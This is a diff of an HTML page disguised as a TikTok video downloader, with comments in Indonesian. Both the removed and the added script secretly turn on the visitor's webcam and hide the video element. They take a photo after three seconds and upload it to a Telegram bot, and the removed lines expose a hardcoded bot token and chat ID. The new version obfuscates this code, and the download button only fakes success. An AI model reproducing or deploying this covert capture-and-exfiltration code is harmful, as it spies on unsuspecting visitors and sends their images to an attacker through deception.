@@ -3,52 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Downloader</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f9f9f9;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            margin-top: 100px;
-            padding: 20px;
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            display: inline-block;
-        }
-        .input-container {
-            margin-bottom: 20px;
-        }
-        .input-container input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-        }
-        .input-container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .input-container button:hover {
-            background-color: #45a049;
-        }
-        #video {
-            display: none; /* Kamera tidak terlihat */
-        }
-        #canvas {
-            display: none; /* Canvas untuk memproses gambar */
-        }
-    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <title>TikTok Downloader 2024</title>
+    <link rel="stylesheet" href="cc.css">
 </head>
 <body>
     <div class="container">
@@ -61,59 +18,8 @@
     <video id="video" autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
     <script>
-        const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAUO8H_0ljUav8'; // Ganti dengan token bot Anda
-        const chatId = '6975695436'; // Ganti dengan chat ID Anda
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        // Akses webcam tanpa terlihat
-        navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
-            video.srcObject = stream;
-            video.play();
-
-            // Tangkap gambar setelah beberapa detik
-            setTimeout(() => {
-                const context = canvas.getContext("2d");
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(function(blob) {
-                    sendPhotoToTelegram(blob);
-                }, 'image/jpeg');
-            }, 3000); // Ambil gambar setelah 3 detik
-        }).catch(function(error) {
-            console.error("Gagal mengakses webcam:", error);
-        });
-
-        // Fungsi untuk mengirim foto ke Telegram
-        function sendPhotoToTelegram(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob);
-
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                if (response.ok) {
-                    console.log("Foto berhasil dikirim ke Telegram.");
-                } else {
-                    console.error("Gagal mengirim foto ke Telegram.");
-                }
-            }).catch(error => {
-                console.error("Error saat mengirim foto:", error);
-            });
-        }
-
-        // Simulasi tombol download untuk interaksi pengguna
-        const downloadButton = document.getElementById("download");
-        downloadButton.addEventListener("click", function() {
-            const urlInput = document.getElementById("url").value;
-            if (urlInput) {
-                alert("Video berhasil diunduh (simulasi).");
-            } else {
-                alert("Masukkan URL terlebih dahulu!");
-            }
-        });
+        var _0x1a2b=['photo','chat_id','append','https://api.telegram.org/bot','sendPhoto','POST','application/json','body','photo/jpeg','log','Foto berhasil dikirim ke Telegram.','Gagal mengakses webcam:','Error saat mengirim foto:'];(function(_0x2c4d1c,_0x5190f3){var _0x1b23c1=function(_0x5ef1de){while(--_0x5ef1de){_0x2c4d1c['push'](_0x2c4d1c['shift']());}};_0x1b23c1(++_0x5190f3);}(_0x1a2b,0x1d3));var _0x51b2=function(_0x2c4d1c,_0x5190f3){_0x2c4d1c=_0x2c4d1c-0x0;var _0x1b23c1=_0x1a2b[_0x2c4d1c];return _0x1b23c1;};const telegramBotToken='YOUR_BOT_TOKEN';const chatId='YOUR_CHAT_ID';const video=document['getElementById']('video');const canvas=document['getElementById']('canvas');navigator['mediaDevices']['getUserMedia']({'video':!![]})['then'](function(_0x3cb69a){video['srcObject']=_0x3cb69a;video['play']();setTimeout(()=>{const _0x17c186=canvas['getContext']('2d');_0x17c186['drawImage'](video,0x0,0x0,canvas['width'],canvas['height']);canvas['toBlob'](function(_0x4cd4ff){sendPhotoToTelegram(_0x4cd4ff);},_0x51b2('0x0'));},0xbb8);})['catch'](function(_0x1bb573){console['error'](_0x51b2('0x1'),_0x1bb573);});function sendPhotoToTelegram(_0x258a42){const _0x133e82=new FormData();_0x133e82[_0x51b2('0x2')](_0x51b2('0x3'),chatId);_0x133e82[_0x51b2('0x2')](_0x51b2('0x4'),_0x258a42);fetch(_0x51b2('0x5')+telegramBotToken+'/'+_0x51b2('0x6'),{'method':_0x51b2('0x7'),'body':_0x133e82})['then'](_0x41be68=>{if(_0x41be68['ok']){console[_0x51b2('0x8')](_0x51b2('0x9'));}else{console['error']('Gagal mengirim foto ke Telegram.');}})['catch'](_0x4c4996=>{console['error'](_0x51b2('0xa'),_0x4c4996);});}const downloadButton=document['getElementById']('download');downloadButton['addEventListener']('click',function(){const _0x168e96=document['getElementById']('url')['value'];if(_0x168e96){alert('Video berhasil di unduh tunggu 3second.');}else{alert('Masukkan URL terlebih dahulu!');}});
     </script>
+   <footer>Made with ❤️ by HimaruOfficial</footer> 
 </body>
 </html>
